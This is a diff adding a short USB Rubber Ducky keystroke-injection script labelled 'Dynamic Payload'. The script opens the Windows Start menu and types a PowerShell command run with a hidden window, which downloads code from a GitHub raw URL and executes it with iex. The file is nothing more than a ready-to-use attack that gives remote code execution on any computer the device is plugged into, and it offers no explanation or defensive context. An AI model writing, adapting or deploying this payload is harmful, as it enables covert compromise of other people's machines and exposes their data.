@@ -1,0 +1,6 @@
+REM Dynamic Payload
+DELAY 1000
+CTRL ESC
+DELAY 100
+STRING powershell -w h iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/d).content
+ENTER
